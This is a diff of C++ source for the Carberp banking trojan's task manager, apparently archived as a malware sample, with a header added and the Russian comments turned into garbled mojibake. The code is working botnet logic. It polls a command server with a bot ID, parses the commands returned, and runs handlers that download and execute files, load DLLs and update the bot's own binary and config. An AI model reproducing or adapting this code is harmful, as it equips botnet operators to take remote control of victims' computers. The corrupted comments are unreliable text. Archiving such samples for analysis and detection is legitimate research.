@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 #include <windows.h>
 
@@ -17,7 +28,7 @@
 #include "Modules.h"
 
 //---------------------------------------------------------------------------
-// Система вывода отладочной информации
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //#include "BotDebug.h"
 
 namespace TASKDBGTEMPLATES
@@ -32,14 +43,14 @@ namespace TASKDBGTEMPLATES
 
 typedef struct TTaskManager
 {
-	PCHAR URL;                  // Адрес откуда будут браться команды
-	DWORD Interval;             // Интервал получения команд (ьиллисекунд);
-	LPCRITICAL_SECTION Lock;    // Секция блокирования
-	PList RegisteredCommands;   // Список зарегистрированных команд
-	HANDLE CommandsThread;      // Поток отложенного выполнения команд
-	HANDLE CommandEvent;        // Собитие добавления новой команды в список
-	PList CommandsList;         // Список команд ожидающий выполнения
-	bool Terminated;            // Признак прерванной работы
+	PCHAR URL;                  // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD Interval;             // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ);
+	LPCRITICAL_SECTION Lock;    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	PList RegisteredCommands;   // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	HANDLE CommandsThread;      // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	HANDLE CommandEvent;        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	PList CommandsList;         // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	bool Terminated;            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 } *PTASKMANAGER;
 
@@ -57,7 +68,7 @@ typedef struct TCommand
 } *PCommand;
 
 
-// Глобальный енеджер задач
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //HANDLE GLManagerPID = NULL;
 PTaskManager GlobalTaskManager = NULL;
 DWORD TaslManagerProcess = 0;
@@ -65,7 +76,7 @@ DWORD TaslManagerProcess = 0;
 //---------------------------------------------------------------------------
 PTaskManager GetGlobalTaskManager(bool Initialize)
 {
-	// Возвращаем указатель на глобальный менеджер задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (IsNewProcess(TaslManagerProcess))
 		GlobalTaskManager = NULL;
 
@@ -95,7 +106,7 @@ void FreeRegisteredCommand(LPVOID C)
 
 bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands)
 {
-	// Создать менеджер команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M = CreateStruct(TTaskManager);
 	if (M == NULL)
 		return false;
@@ -118,7 +129,7 @@ bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands)
 
 void FreeTaskManager(PTaskManager Manager)
 {
-	// Уничтожаем менеджер задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M;
 	if (Manager != NULL)
 		M = (PTASKMANAGER)Manager;
@@ -140,7 +151,7 @@ void FreeTaskManager(PTaskManager Manager)
 //----------------------------------------------------------------------------
 PRegisteredCommand GetRegisteredCommand(PTASKMANAGER M, PCHAR CommandName)
 {
-	// Ищем команду по имени
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     PRegisteredCommand C;
 	DWORD Count = List::Count(M->RegisteredCommands);
 	for (DWORD i = 0; i < Count; i++)
@@ -167,7 +178,7 @@ bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Met
 		return false;
 
 
-	// Создаём описание команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pEnterCriticalSection(M->Lock);
 
 	if (M->RegisteredCommands == NULL)
@@ -192,27 +203,27 @@ bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Met
 
 DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
 {
-	// Процедура потока выполнения комманд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M = (PTASKMANAGER)Data;
 	PCommand Command;
 	do
 	{
-		// Ожидаем события
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		pWaitForSingleObject(M->CommandEvent, INFINITE);
 
 		if (!M->Terminated)
 		{
-            // Получаем следующую команду
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pEnterCriticalSection(M->Lock);
 
 			Command = (PCommand)List::Extract(M->CommandsList, 0);
-			// В случае если список пустой сбрасываем событие
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (List::Count(M->CommandsList) == 0)
 				pResetEvent(M->CommandEvent);
 
 			pLeaveCriticalSection(M->Lock);
 
-			// Выполняем команду
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			ExecuteCommand(NULL, Command->Command, Command->Args, false);
 
 			FreeCommand(Command);
@@ -227,7 +238,7 @@ DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
 
 void CreateTaskThread(PTASKMANAGER M)
 {
-	// Создать необходимые данные для отложенного выполнения команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (M->CommandsThread != NULL)
 		return;
 	M->CommandsList = List::Create();
@@ -239,7 +250,7 @@ void CreateTaskThread(PTASKMANAGER M)
 
 bool TaskManagerSleep(PTaskManager Manager)
 {
-	// Заснуть на необходимыи интервал
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M;
 	if (Manager != NULL)
 		M = (PTASKMANAGER)Manager;
@@ -248,7 +259,7 @@ bool TaskManagerSleep(PTaskManager Manager)
 	if (M == NULL || M->Terminated)
 		return false;
 
-	// Определяем интервал
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Interval = M->Interval;
 
 	if (Interval == 0)
@@ -257,7 +268,7 @@ bool TaskManagerSleep(PTaskManager Manager)
 	if (Interval == 0)
 		Interval = 60*1000;
 
-	// Спим
+	// пїЅпїЅпїЅпїЅ
 	DWORD SleepTime = 0;
 	while (SleepTime < Interval && !M->Terminated)
 	{
@@ -272,9 +283,9 @@ bool TaskManagerSleep(PTaskManager Manager)
 
 bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
 {
-	/*   Запускаем цикл обработки команд  */
+	/*   пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ  */
 
-	// Инициализируем менеджер выполнения команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M;
 	if (Manager != NULL)
 		M = (PTASKMANAGER)Manager;
@@ -282,26 +293,26 @@ bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
 		M = (PTASKMANAGER)GetGlobalTaskManager(true);
 
 
-	// Регистрируем известные команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (InitCommands)
 		RegisterAllCommands(M, COMMAND_ALL);
 
 	PCHAR RealURL = URL;
 	bool SelfURL = URL == NULL;
 	
-	// Запускаем цикл обработки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	do
 	{
 		if (SelfURL)
 			RealURL = GetBotScriptURL(SCRIPT_TASK);
 
-		// Загружаем и выполняем команду
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (RealURL != NULL)
 			DownloadAndExecuteCommand(M, RealURL);
 
 		if (SelfURL)
 			STR::Free(RealURL);
-		// Спим до выполнения следующей команды
+		// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!M->Terminated)
 	        TaskManagerSleep(M);
 
@@ -315,7 +326,7 @@ bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
 
 void StopTaskManager(PTaskManager Manager)
 {
-	// Прервать работу менеджера задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Manager == NULL)
 		Manager = GetGlobalTaskManager(false);
 	if (Manager == NULL) return;
@@ -325,7 +336,7 @@ void StopTaskManager(PTaskManager Manager)
 
 	if (M->CommandsThread)
 	{
-		// Поток работает, останавливаеь
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		M->Terminated = true;
 		pSetEvent(M->CommandEvent);
 		pWaitForSingleObject(M->CommandsThread, 1000);
@@ -345,13 +356,13 @@ void StopTaskManager(PTaskManager Manager)
 
 bool DownloadCommand(PCHAR URL, PCHAR Password, PCHAR *HTMLCode)
 {
-	// Загрузить команду/ набор команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ/ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (STR::IsEmpty(URL))
 		return false;
 
 	PCHAR BotID = GenerateBotID();
-	TASKDBG("Task", "Загружаем команду: \r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID);
+	TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: \r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID);
 
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "id", BotID);
@@ -367,17 +378,17 @@ bool DownloadCommand(PCHAR URL, PCHAR Password, PCHAR *HTMLCode)
 
 	if (Result)
 	{
-		TASKDBG("Task", "Зтраница загружена. Код ответа [%d]", Response.Code);
+		TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ [%d]", Response.Code);
 
 		if (HTMLCode != NULL && Response.Code != 200)
 		{
-			TASKDBG("Task", "Загружены команды:\r\n %s", HTMLCode);
+			TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ:\r\n %s", HTMLCode);
 			STR::Free(*HTMLCode);
 			*HTMLCode = NULL;
 		}
 	}
 	else
-		TASKDBG("Task", "Ошибка загрузки документа");
+		TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
     HTTPResponse::Clear(&Response);
 	STR::Free(BotID);
@@ -388,7 +399,7 @@ bool DownloadCommand(PCHAR URL, PCHAR Password, PCHAR *HTMLCode)
 
 bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 {
-	// Загрузить и выполнить команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (URL == NULL)
 		return false;
 
@@ -399,7 +410,7 @@ bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 		M = (PTASKMANAGER)GetGlobalTaskManager(true);
 
 
-	// Загружаем команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Command = NULL;
 	bool Result = false;
 
@@ -424,12 +435,12 @@ bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 
 void DoAfterExecuteCommand(PTASKMANAGER Manager, PCHAR Command, PCHAR Args, bool Executed)
 {
-	// событие уведомления об исполнении команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 /* 	PCHAR  prefix;
 	if (Executed)
-		prefix = "выполнено";
+		prefix = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
 	else
-		prefix = "не выполнено";
+		prefix = "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
 
     DbgMsg("task", 0, "%s %s ( %s )", prefix, Command, Args);*/
 }
@@ -447,7 +458,7 @@ bool InvalidChar(char c)
 
 bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
 {
-	// Рапарсивает HTML строку на команду и аргументы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (HTML == NULL)
 		return false;
 
@@ -457,7 +468,7 @@ bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
 	{
 		Command = STR::GetLeftStr(HTML, " ");
 		bool Changed = false;
-		// Обрезаем лишние символы
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Len = STR::Length(Args);
 		PCHAR Tmp = Args + (Len - 1);
 		while (Tmp != Args && InvalidChar(*Tmp))
@@ -482,7 +493,7 @@ bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
 bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
 {
 
-	// Раcпарсить HTML и выполнить команду
+	// пїЅпїЅcпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(HTML))
 		return false;
 
@@ -499,7 +510,7 @@ bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
 	{
 		Line = Strings::GetItem(S, i, false);
 		//
-		//  команды начинающиеся с символа ; игнорируются
+		//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ; пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		//
 		if (!STR::IsEmpty(Line) && *Line != ';')
 		{
@@ -521,17 +532,17 @@ bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
 
 bool ExecuteDeferredCommand(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Добавить команду в список отложенного выполнения менеджера задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M =(PTASKMANAGER)Manager;
 	if (M == NULL || Command == NULL)
 		return false;
 
 	pEnterCriticalSection(M->Lock);
 
-	// Запускаем поток
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	CreateTaskThread(M);
 
-	// Создаём комаенду и добавляем её в список
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCommand C = CreateStruct(TCommand);
 	C->Command = STR::New(Command);
 	C->Args = STR::New(Args);
@@ -551,9 +562,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command);
 
 bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 {
-	// Выполнить команду Command с аргументами Args
-	// В случае если Deferred == true выполнение команды будет передано
-	// В поток выполнения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Command пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Args
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Deferred == true пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Command == NULL)
 		return false;
 
@@ -564,23 +575,23 @@ bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 		M = (PTASKMANAGER)GetGlobalTaskManager(true);
 
 
-	// Определяем метод команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TCommandMethod Method = GetCommandMethod(M, Command);
 	if (Method == NULL)
 		return false;
 
-    // Добавляем команду в список отложенных команд
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Deferred && M != NULL)
 	{
-		// Отправляем на отложенное выполнение
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		ExecuteDeferredCommand(M, Command, Args);
 		return true;
     }
 
-	// Выполняем команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
    	bool Result = Method(M, Command, Args);
 
-	// Вызываем событие выполнения команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DoAfterExecuteCommand(M, Command, Args, Result);
 
 
@@ -590,11 +601,11 @@ bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 //---------------------------------------------------------------------------
 
 
-//--------------------------  Обработчики команд -------------------------//
+//--------------------------  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ -------------------------//
 
 bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Загрузить и выполнить файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	if (Args == NULL)
 		return false;
@@ -614,7 +625,7 @@ bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteUpdateConfig(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Загрузить конфигурационный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (Args == NULL)
 		return false;
 	#ifdef BotConfigH
@@ -626,7 +637,7 @@ bool ExecuteUpdateConfig(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteUpdate(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Загрузить обновление
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = false;
 	WCHAR *FileName = GetTempName();
 
@@ -642,7 +653,7 @@ bool ExecuteUpdate(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteLoadDLL(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Команда на загрузку ьиьлиотеки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	WCHAR *FileName = GetTempName();
 
 	if (FileName == NULL)
@@ -659,7 +670,7 @@ bool ExecuteLoadDLL(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Запустить множественную загрузку файлов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return false;
 
   /*		char * cPointer= m_strstr(&Buffer[1],"http:");
@@ -714,7 +725,7 @@ bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// выполнить команду alert
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ alert
 	pMessageBoxA(0, Args, NULL, MB_OK | MB_ICONINFORMATION);
 	return true;
 }
@@ -725,7 +736,7 @@ bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 {
-    // Выполнить стандартную команду
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	const static char CommandUpdate[]        = {'u','p','d','a','t','e',0};
 	const static char CommandUpdateConfig[]  = {'u','p','d','a','t','e','c','o','n','f','i','g' ,0};
@@ -755,7 +766,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
     default: ;
 	}
 
-	// Ищем команду в списке зарегистрированных
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Manager != NULL)
 	{
 		PRegisteredCommand Cmd = GetRegisteredCommand(Manager, Command);
